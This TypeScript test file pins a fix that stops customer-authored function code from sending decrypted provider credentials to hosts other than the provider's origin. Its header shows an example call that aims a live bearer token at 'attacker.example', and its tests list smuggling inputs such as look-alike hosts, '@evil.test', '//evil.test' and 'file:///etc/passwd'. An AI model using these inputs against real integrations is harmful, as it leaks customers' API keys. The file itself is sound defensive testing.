/**
 * PROVIDER CREDENTIALS MUST NOT LEAVE THE PROVIDER'S ORIGIN
 * =========================================================
 * `ctx.integrations.<id>.request(method, path, …)` attaches the customer's
 * decrypted provider key via `spec.buildHeaders(key)` before sending. The path
 * argument was accepted as an absolute URL and used verbatim:
 *
 *   const url = /^https?:\/\//i.test(path) ? path : `${base}${path}`
 *
 * so customer-authored function code could write
 *
 *   ctx.integrations.openai.request('GET', 'https://attacker.example/')
 *
 * and a live `Authorization: Bearer sk-…` was delivered to a host of its
 * choosing. The function never gets to READ the key — it just gets to aim it.
 *
 * This is a narrower and more serious bug than the `ctx.http.*` SSRF, because
 * the request is pre-authenticated. These tests pin the fix.
 */

import { resolveProviderUrl } from '@/lib/services/ai-functions/integration-context'

const BASE = 'https://api.openai.com/v1'

describe('resolveProviderUrl — relative paths', () => {
  it('joins a leading-slash path', () => {
    expect(resolveProviderUrl(BASE, '/chat/completions', 'openai')).toBe(
      'https://api.openai.com/v1/chat/completions',
    )
  })

  it('joins a path with no leading slash', () => {
    expect(resolveProviderUrl(BASE, 'models', 'openai')).toBe('https://api.openai.com/v1/models')
  })

  it('preserves a query string', () => {
    expect(resolveProviderUrl(BASE, '/models?limit=5', 'openai')).toBe(
      'https://api.openai.com/v1/models?limit=5',
    )
  })
})

describe('resolveProviderUrl — absolute URLs', () => {
  // The legitimate case this keeps working: some APIs hand back absolute
  // next-page URLs on their own host.
  it('allows an absolute URL on the provider origin', () => {
    expect(resolveProviderUrl(BASE, 'https://api.openai.com/v1/models?after=x', 'openai')).toBe(
      'https://api.openai.com/v1/models?after=x',
    )
  })

  it('REFUSES an absolute URL on a different host', () => {
    expect(() => resolveProviderUrl(BASE, 'https://attacker.example/', 'openai')).toThrow(
      /refusing to send openai credentials/i,
    )
  })

  it('refuses a look-alike host', () => {
    // Suffix-matching allowlists fail exactly here.
    expect(() => resolveProviderUrl(BASE, 'https://api.openai.com.evil.test/', 'openai')).toThrow(
      /refusing to send/i,
    )
  })

  it('refuses a scheme downgrade on the same host', () => {
    // http:// to the same host is a different origin and would put the
    // credential on the wire in plaintext.
    expect(() => resolveProviderUrl(BASE, 'http://api.openai.com/v1/models', 'openai')).toThrow(
      /refusing to send/i,
    )
  })

  it('refuses a different port on the same host', () => {
    expect(() => resolveProviderUrl(BASE, 'https://api.openai.com:8443/v1', 'openai')).toThrow(
      /refusing to send/i,
    )
  })

  it('refuses a non-http scheme', () => {
    expect(() => resolveProviderUrl(BASE, 'file:///etc/passwd', 'openai')).toThrow(
      /refusing to send|not a valid URL/i,
    )
  })

  it('names an alternative in the error so the fix is obvious', () => {
    expect(() => resolveProviderUrl(BASE, 'https://attacker.example/', 'openai')).toThrow(
      /ctx\.http\.get\/post/,
    )
  })
})

describe('resolveProviderUrl — hostile path shapes', () => {
  /**
   * The classic authority-confusion payload. It only works when the base has
   * no path component, so it is a regression guard for a future provider whose
   * baseUrl is a bare origin.
   */
  it('cannot smuggle an authority past a bare-origin base', () => {
    const bare = 'https://api.example.com'
    const url = resolveProviderUrl(bare, '@evil.test/x', 'demo')
    expect(new URL(url).host).toBe('api.example.com')
  })

  it('cannot smuggle an authority via a protocol-relative path', () => {
    // `//evil.test/x` is protocol-relative and would resolve to another host
    // if it were ever passed to a URL resolver rather than concatenated.
    const url = resolveProviderUrl(BASE, '//evil.test/x', 'demo')
    expect(new URL(url).host).toBe('api.openai.com')
  })

  it('rejects an absolute URL when the provider has no usable base', () => {
    expect(() => resolveProviderUrl('', 'https://attacker.example/', 'posthog')).toThrow(
      /no usable base URL/,
    )
  })
})
